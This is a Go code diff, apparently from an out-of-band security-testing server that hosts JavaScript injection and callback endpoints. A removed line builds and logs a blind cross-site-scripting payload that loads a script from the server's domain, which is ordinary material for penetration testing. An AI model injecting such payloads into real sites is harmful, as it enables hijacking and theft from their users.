@@ -11,7 +11,6 @@ import (
 	"net/http/httptest"
 	"net/http/httputil"
 	"os"
-	"path"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -79,8 +78,7 @@ func NewHTTPServer(options *Options) (*HTTPServer, error) {
 	router := &http.ServeMux{}
 	router.Handle("/", server.logger(http.HandlerFunc(server.defaultHandler)))
 	if options.JsResp {
-		payload := fmt.Sprintf("><script src=//%s></script>", path.Join(server.getFqdn(nil), JsEndpoint))
-		gologger.Info().Msgf(`Serving js injection at '%s' inject with: %s`, JsEndpoint, payload)
+		gologger.Info().Msgf(`Serving js injection at '%s'`, JsEndpoint)
 		router.Handle(JsEndpoint, server.logger(http.HandlerFunc(server.jsHandler)))
 		router.Handle(JsCallbackEndpoint, server.logger(http.HandlerFunc(server.jsCallbackHandler)))
 		router.Handle(PageCallbackEndpoint, server.logger(http.HandlerFunc(server.jsCallbackHandler)))
@@ -506,20 +504,19 @@ func (h *HTTPServer) jsHandler(w http.ResponseWriter, req *http.Request) {
 // jsCallbackHandler is a handler for /js_callback and /page_callback endpoints
 func (h *HTTPServer) getJsCallbackURL(req *http.Request) string {
 	var scheme string
-	if h.options.HttpsPort > 0 {
+	if h.options.HttpsPort > 0 && req.TLS != nil {
 		scheme = "https"
 	} else {
 		scheme = "http"
 	}
+
 	// override with request if provided
 	if req != nil && req.URL.Scheme != "" {
 		scheme = req.URL.Scheme
 	}
 
-	callbackHost := h.getFqdn(req)
-	if callbackHost == "" {
-		callbackHost = h.options.IPAddress
-	}
+	// infer the callback from host header
+	callbackHost := req.Host
 
 	return fmt.Sprintf("%s://%s", scheme, callbackHost)
 }
